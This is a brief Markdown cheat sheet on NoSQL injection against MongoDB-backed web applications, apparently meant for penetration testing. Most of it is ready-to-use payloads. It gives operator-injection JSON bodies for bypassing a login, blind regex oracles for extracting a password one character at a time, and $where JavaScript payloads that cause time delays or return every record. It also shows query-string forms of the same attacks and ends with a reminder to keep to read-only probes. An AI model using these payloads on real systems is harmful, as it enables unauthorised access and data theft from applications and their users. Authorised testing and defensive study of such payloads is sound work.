# NoSQL injection (MongoDB and friends)

Usually JSON body params or query params that a server passes to a Mongo query. Classic
signals: error strings like `MongoError`, `$where`, `Cannot use 'undefined'`, or operator
syntax being evaluated instead of treated as a string.

## Operator injection (MongoDB)

Send JSON where the value is an object, not a string:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "MARKER.*"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin"]}, "password": {"$ne": ""}}
```

If any of these logs you in / returns data without a valid password → auth bypass.

## Data exfiltration (blind, regex + timing)

```
{"username":"admin","password":{"$regex":"^a"}}            -> boolean (response differs)
{"username":"admin","password":{"$regex":"^.{1}$"}}        -> length oracle
{"username":"admin","password":{"$regex":"^MARKER"}}       -> prefix oracle
```

## `$where` / JS evaluation (MongoDB)

```
{"$where": "sleep(5000)"}                                  -> time-based
{"$where": "this.password == 'MARKER'"}
{"$where": "1"}                                            -> always-true (return all)
```

## Query-string forms

`?username[$ne]=x&password[$ne]=y`  (PHP/Express body parsers expand `a[b]` into objects)

## Notes

- Confirm with `--show-body` (quote the returned doc as PoC) and `--diff` for same-length
  boolean responses.
- Never run a destructive `$where`/`db.drop()` — read-only oracles only.
